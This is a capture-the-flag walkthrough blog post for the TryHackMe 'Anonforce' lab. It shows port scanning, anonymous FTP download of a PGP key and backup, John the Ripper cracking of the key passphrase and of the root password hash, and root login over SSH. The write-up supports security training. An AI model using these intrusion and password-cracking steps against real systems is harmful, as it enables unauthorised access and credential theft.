---
layout: post
title: "Anonforce"
date: 2022-02-04
categories: [Tryhackme, Easy-THM]
tags: [security]
image: ../../assets/img/posts/anonforce.png 

---

## Description

You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth. 

|**Room**|[Anonforce](https://tryhackme.com/room/bsidesgtanonforce)|
|:---:|:---:|
|**OS**|Linux|
|**Difficulty**|Easy|
|**Creator**|[stuxnet](https://tryhackme.com/p/stuxnet)|

---

Deploy the machine and quickly scan the ports with rustscan,

```bash
rustscan -a 10.10.246.163
```

![image](https://user-images.githubusercontent.com/67465230/187165309-d20b64f8-0d80-4ac9-8a8f-5d4394df9fb4.png)

we get 2 open port. Lets scan this using nmap,

```bash
nmap -sV -sC -p21,22 10.10.246.163 -oN nmap.txt
```

![image](https://user-images.githubusercontent.com/67465230/187165361-4d72f3f5-5612-48ed-a824-f283a767a852.png)
![image](https://user-images.githubusercontent.com/67465230/187165399-d94b4acd-435a-4606-a9e2-43fbaf9afe1d.png)

Result scan reveals that port 21 is running vsftpd with anonymous login and port 22 is running ssh service. Enumerate port 21.

Lets connect to ftp service,

```bash
ftp 10.10.246.163
```

![image](https://user-images.githubusercontent.com/67465230/187165464-46044d48-b0be-452e-95f9-ba130f2e1f94.png)

we got in.

Establishing directory content,

![image](https://user-images.githubusercontent.com/67465230/187165507-bba5445e-f7da-4a8d-8f99-997bf9e22716.png)

navigating to home directory and list directory content,

![image](https://user-images.githubusercontent.com/67465230/187165551-1227f979-d303-4b00-9d15-a24e21847466.png)

we got melodias user.

navigating to user directory and list directory content,

![image](https://user-images.githubusercontent.com/67465230/187165597-9583732e-1cb0-48cd-b64a-4ec850bcb78e.png)

we got our user flag. But since we cannot read it, we can take this user.txt file on our system using `get`,

```bash
get user.txt
```

Now, there is also a **notread** directory in system directory as well, so taking a look inside directory reveals that there are 2 files backup.pgp file and private.asc,

![image](https://user-images.githubusercontent.com/67465230/187165628-fa93c85b-c9dc-4a3a-ab63-35dc8d668e41.png)

We can get these files on our system,

```bash
get backup.pgp
get private.asc
```

We can convert this key into crack-able hash,

```bash
gpg2john private.asc > crackmejohn
```

Now using JTR, we can crack the hash,

```bash
john crackmejohn --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/67465230/187165680-d9e43be5-30ae-4381-aa08-5174fb47b74c.png)

we got our password, xbox360.

Now, we can import this private key so that we can decrypt the backup key,

```bash
gpg --import private.asc
```

![image](https://user-images.githubusercontent.com/67465230/187165727-c1c6d933-df95-4fc2-a856-ee68d3e858ba.png)

Now, we can decrypt the backup.pgp file using the password we got,

```bash
gpg --output backup --decrypt backup.pgp
```

![image](https://user-images.githubusercontent.com/67465230/187165766-1627dd00-445c-422c-aaaf-27ba18a898a7.png)

Reading the content of backup we just decrypted,

![image](https://user-images.githubusercontent.com/67465230/187165878-d613c777-3580-4153-9635-ef95699399c3.png)

We got the password hash of root user.

Let's put this hash in a file,

```bash
echo "$6$07nYFaYf$************************************************.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0" > root_hash
```

Now, using JTR to crack this hash,

```bash
john root_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image](https://user-images.githubusercontent.com/67465230/187166130-4f989667-7fd0-4b47-b353-0c2401f0cfc2.png)

We can get into machine via ssh,

```bash
ssh root@10.10.246.163
```

![image](https://user-images.githubusercontent.com/67465230/187166171-f989b132-859d-4994-bf49-459581162881.png)

we get in as root user.